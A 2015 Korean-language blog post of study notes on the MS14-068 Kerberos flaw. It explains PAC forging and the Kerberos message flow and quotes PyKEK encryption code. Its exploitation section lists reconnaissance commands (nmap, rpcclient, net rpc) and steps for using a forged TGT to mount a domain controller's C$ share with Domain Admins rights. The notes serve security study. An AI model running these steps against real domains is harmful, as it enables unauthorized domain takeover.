---
layout: post
title: "MS14-068: Vulnerabilities in Kerberos"
date: 2015-06-12 11:08:09 +0900
comments: true
categories: 
---

MS14-068:

* [From MS14-068 to Full Compromise - Step by Step](https://www.trustedsec.com/december-2014/ms14-068-full-compromise-step-step/)
* [Digging into MS14-068, Exploitation and Defense](https://labs.mwrinfosecurity.com/blog/2014/12/16/digging-into-ms14-068-exploitation-and-defence/)
* [Exploiting MS14-068 Vulnerable Domain Controllers Successfully with the Python Kerberos Exploitation Kit (PyKEK)](http://adsecurity.org/?p=676)
* [A Quick Look at MS14-068](http://blog.beyondtrust.com/a-quick-look-at-ms14-068)
* [Windows Kerberos - Elevation of Privilege (MS14-068)](https://www.exploit-db.com/exploits/35474/)

Kerberos:

* [Basic Concepts for the Kerberos Protocol](https://technet.microsoft.com/en-us/library/cc961976.aspx)
* [Kerberos Protocol Overview](https://msdn.microsoft.com/en-us/library/cc246080.aspx)
* [MS-PAC: Privilege Attribute Certificate Data Structure](https://msdn.microsoft.com/en-us/library/cc237917.aspx)
* [PAC_SIGNATURE_DATA](https://msdn.microsoft.com/en-us/library/cc237955.aspx)
* [Kerberos, Active Directory's Secret Decoder Ring](http://adsecurity.org/?p=227)
* [Kerberos: An Authentication Service for Open Network Systems](http://cs.unc.edu/~fabian/course_papers/steiner_neuman.pdf) 
* [The Evolution of the Kerberos Authentication Service](http://www.isi.edu/div7/publication_files/evolution_of_kerberos.pdf)
* [How the Kerberos Version 5 Authentication Protocol Works](https://technet.microsoft.com/en-us/library/cc772815\(v=ws.10\).aspx)

Other attacks:

* [Detecting Forged Kerberos Ticket (Golden Ticket & Silver Ticket) Use in Active Directory](http://adsecurity.org/?p=1515)
* [Python Kerberos Exploitation Kit](https://github.com/bidord/pykek)
* [The International Conference on PASSWORDS 2014](http://livestream.com/NTNU/passwords14/videos/70751388?t=1418474079423)
* [Still Passing the Hash 15 Years Later...](https://media.blackhat.com/bh-us-12/Briefings/Duckwall/BH_US_12_Duckwall_Campbell_Still_Passing_Slides.pdf)

### 요체

이 버그의 요체는 KDC 가 가짜 PAC 를 서명하게 만드는 것.

PAC 은 krbtgt 의 키로 hmac-md5 / hmac-sha1-96-aes256 사인되어있는데. 가짜 PAC 를 어떻게 만들 수 있을까?

두가지 트릭을 사용하는데,

1. 각종 Admin 그룹 권한을 잔뜩 넣은 가짜 PAC 를 만들고, HMAC 이 아니라, MD5 로 서명을 하는 것. 패치전 MS Kerberos 코드에서는 HMAC 이 아니어도 crypto algorithm 을 돌려서 나온 결과가 일치하면 넘어갔다.

2. 서명은 HMAC 이 아니라 MD4 로 그냥 넘어갔다고 쳐도, TGT 는 K_s (서비스 서버) 로 암호화되는데, 이걸 어떻게 하냐가 핵심. Sylvain Monné 에 따르면, TGS-REQ 에 {TGT}K_s 형태로 보내지 말고, TGS-REQ 의 enc-authorization-data 세그먼트에 TGT 세션키로 암호화해서 집어넣어도 된다고 한다. 좀 더 들여다봐야겠지만, TGS-REQ 에 가짜를 보내면 TGS-REP 에 krbtgt 와 logon 서버가 서명한 PAC 가 오는 모양.

[Microsoft 에 따르면](http://blogs.technet.com/b/srd/archive/2014/11/18/additional-information-about-cve-2014-6324.aspx)
Windows Server 2008R2 이하에서 돌아가는 Domain Controller 는 취약하다 (패치안된). 2012 는 관련된 유사한 공격에 취약하지만, exploit 하기 더 어렵다고한다.

### Kerberos

일단 커버러스 모델에 대해서 알아봐야겠다.

#### Initial Setup

커버러스에서는 TTP (Trusted Third Party) 인 KDC (Key Distribution Center) 가 존재하는 것이 핵심. KDC 는 realm 에 참여하는 모든 entity 와 각각 개별적으로 share 하는 symmetric key 가 있다. 조직 크기에 따라 수십개에서 수만개에 달할 저 symmetric key 를 어떻게 generate 해서 share 하는지는 일단 논외.

일단 V4 기준으로 정리해본다.

1. 어떤 Client 는 어떤 Server 에 서비스를 요청하고 싶어한다.
2. Client 는 KDC 에 c,s,n 을 보낸다. c 는 client identity, s 는 접근하고 싶은 server identity, n 은 replay 를 방지할 nonce.
3. KDC 는 Client 에게 2 개의 정보를 보낸다. 
4. {Session Key,Ticket}K_c 형태로 보내는데, the client 와 KDC 가 공유하고 있는 symmetric key K_c 로 암호화해서 보내기때문에, 아무나 못푼다.
5. Session Key 는 the client 와 the server 가 통신할 때 사용할 세션키.
6. Ticket 은 일단 the server 와 KDC 가 공유하고 있는 symmetric key K_s 로 암호화되서 아무나 못푼다. 오직 the server 만 풀수있다.
7. Ticket 내용은 {client,start,expire,Session Key}K_s 인데, client identity, 티켓의 유효기간 start ~ expire, 그리고 the client 와 the server 가 사용할 세션키.
9. 일단 4 로 돌아가서, client 는 `session key` 와 `ticket` 을 받았다.
10. 이제 the client 는 the server 에, {A_c}session_key, Ticket 을 보낸다. Ticket 은 각종 정보를 K_s 로 암호화한 것.

이제 윈도우즈 버전으로 가본다.

#### Kerberos in a Windows Domain

* [Kerberos Explained](https://msdn.microsoft.com/en-us/library/bb742516.aspx)

KDC 에서 Ticket 을 얻어서 타겟 Service 에 Ticket 을 보내는 흐름은 다음과 같다.

1. AS-REQ: The user 가 KDC 에 보내는 메시지. user identity 와 timestamp 를 KDC 로 보낸다. timestamp 는 유저의 패스워드 해쉬로 암호화한다. AD 에 저장되어있는 패스워드를 사용해 timestamp 를 decrypt 해봐서 올바른 시간이 나오면 replay 가 아니란 것을 알수 있다.
2. AS-REP: The user 의 신원을 성공적으로 확인했다면, 세션키와 TGT (Ticket Granting Ticket) 를 보낸다. TGT 에는 `Client Name`, `Start`, `End`, `Session Key`, `Privilege Attribute Certificate (PAC)`, `Server Signature`, `KDC Signature` 가 들어있다. TGT 는 K_krbtgt 로 암호화된다. 세션키는 K_c 로 암호화된다. 여기까지는 KDC 랑 서비스 서버랑 krbtgt 로 동일한 상황. 요구하는 서비스가 Ticket Granting Service 이기때문.

3. TGS-REQ: 접근하고자하는 Service name, TGT (Ticket Granting Ticket), Authenticator 를 서비스에 보낸다. Authenticator 는 { user ID, timestamp }K_c,s 로 암호화된다.
4. TGS-REP: TGS 는 K_krbtgt 를 이용해 TGT 를 복호화한다. TGT 안에 세션키가 있으니, 그 세션키로 Authenticator 를 복호화한다. Authenticator 의 내용과 TGT 의 내용을 비교 검증한다. OK 라면, 서비스 티켓을 찍어낼 차례이다. 서비스 티켓에 PAC 를 복사한다. 서비스 티켓의 PAC 는 krbtgt 키와 K_logon 로 서명된다. 서비스 티켓은 K_logon 로 암호화된다. 이제 클라이언트는 예를 들어 로그온 서버에 이 서비스 티켓을 제출하고 사용을 허가받을 수 있다.

#### AS-REQ

`AS-REQ` 의 큰 두가지 핵심은 암호화된 timestamp 와 유저의 신원 정보.

유저의 신원 정보는,

* cname = 사용자 ID
* realm = domain (i.e. BABOCORP.GLOBAL)
* service = 'krbtgt'
* host = domain (i.e. BABOCORP.GLOBAL)
* etype = RC4_HMAC
* kdc_options = (Forwardable, Proxiable, Renewable, Canonicalize)
* nonce = random 31 bits

`AS-REQ` 를 만들때 timestamp 를 유저의 패스워드로 암호화하는데 그 과정을 보면,

``` python 유저의 인풋을 해쉬해서 암호화 키로 쓰는 장면
    pass = getpass("Password: ")
    unicode_pass = pass.encode('utf-16le')
    md4_pass = MD4.new(unicode_pass))
    md4_digest = md4_pass.digest()
    user_key = (RC4_HMAC, md4_digest)
```

이제 `build_pa_enc_timestamp(current_time, key)` 에서 timestamp 를 암호화하는데,

``` python
def build_pa_enc_timestamp(current_time, key):
    gt, ms = epoch2gt(current_time, microseconds=True)
    pa_ts_enc = PaEncTsEnc()
    pa_ts_enc['patimestamp'] = gt
    pa_ts_enc['pause'] = ms

    pa_ts = PaEncTimestamp()
    pa_ts['etype'] = key[0]
    pa_ts['cipher'] = encrypt(key[0], key[1], 1, encode(pa_ts_enc))

    return pa_ts
```

`pa_ts` 의 `etype` 과 `cipher` 에 각각 `RC4_HMAC` 과 유저가 입력한 패스워드의 해쉬를 세팅한다.

`PaEncTimestamp()` 는 ASN.1 으로 `etype`, `cipher` 를 가지고 있다.

* [A Layman's Guide to a Subset of ASN.1, BER, and DER](http://luca.ntop.org/Teaching/Appunti/asn1.html)

유저가 입력한 패스워드 해쉬로 timestamp 를 암호화한다.

``` python encrypt()
def encrypt(etype, key, msg_type, data):
    if etype != RC4_HMAC:
        raise NotImplementedError('Only RC4-HMAC supported!')
    k1 = HMAC.new(key, pack('<I', msg_type)).digest()
    data = random_bytes(8) + data
    chksum = HMAC.new(k1, data).digest()
    k3 = HMAC.new(k1, chksum).digest()
    return chksum + ARC4.new(k3).encrypt(data)
```

1. 우선 유저가 입력한 패스워드의 MD4 해쉬를 키로, 1 을 HMAC 돌린다.
2. data 앞에 랜덤 바이트를 8 bytes 붙인다.
3. 1. 을 키로 pa_ts_enc 구조에 HMAC 을 돌린다. 이게 체크섬.
4. 체크섬에 또 한번 HMAC 을 돌린다.
5. 4. 를 암호키로 pa_ts_enc 구조에 RC4 를 돌린다.
6. 체크섬 + 5. 가 `RC4_HMAC` 값이 된다.

### Packets

adsecurity.org 에서 WireShark packets 을 다운받아 훑어보았다.

#### AS-REQ

* padata 에는 kRB5-PADATA-ENC-TIMESTAMP (eTYPE-ARCFOUR-HMAC-MD5, cipher)
* req-body 에는 cname (i.e. darthsidious / LAB.ADSECURITY.ORG), sname (i.e. krbtgt / LAB.ADSECURITY.ORG), etype (eTYPE-ARCFOUR-HMAC-MD5)

#### AS-REP

#### TGS-REQ

#### TGS-REP

### Exploitation

#### Discovery

nmap 으로 FQDN, Domain name, Windows Version 등을 확인한다.

```
# nmap --script smb-os-discovery.nse -p445 xxx.xxx.xxx.xxx
```

Powershell 커맨드들.

```
PS C:\> Get-ADDomainController -filter *
PS C:\> Get-HotFix -ID KB3011780 -ComputerName xxx.xxx.xxx.xxx
```

```
$ net time -S x.x.x.x

$ rdate -n x.x.x.x

$ net rpc -W DOMAIN -U user01 -S x.x.x.x shell
Enter user01's password:
Talking to domain DOMAIN (S-1-5-21....)
net rpc> user
net rpc user> show
net rpc user> show user01
user rid: 1105, group rid: 513

$ rpcclient -U user01 x.x.x.x
rpcclient $> lookupnames user01
user01 S-1-9-xxx (User: 1)
rpcclient $>

# apt-get install cifs-utils krb5-user
# cat > /etc/krb5.conf << 'EOF'
[libdefaults]
default_realm = DOMAIN # upper
dns_lookup_realm = true
dns_lookup_kdc = true
[realms]
DOMAIN = {
kdc = DC:88 # upper
admin_server = DC # lower
default_domain = domain # lower
}
[domain_realm]
.xxx.xxx.xxx = DOMAIN # lower = upper
EOF
# rdate -n DC
# kinit user@domain
# rpcclient -U user DC
# cp TGT* /tmp/krb5cc_0
# smbclient -W domain //DC/c$ -k
```

#### Uptime

Responder.py

#### RID Enumeration

ridenum.py

#### mimikatz

mimikatz.exe

#### PyKEK

pykek 이 forge 하는 group membership 은

```
Domain Users (513)
Domain Admins (512)
Schema Admins (518)
Enterprie Admins (519)
Group Policy Creator Owners (520)
```

[PyKEK Kerberos Packets on the Wire aka How the MS14-068 Exploit Works](http://adsecurity.org/?p=763)

### Patch

blog.beyondtrust.com 의 글을 보니, VerifyPacSignature() 에서 SignatureType 이 HMAC_MD5 인지 비교하는 코드가 들어간 모양.

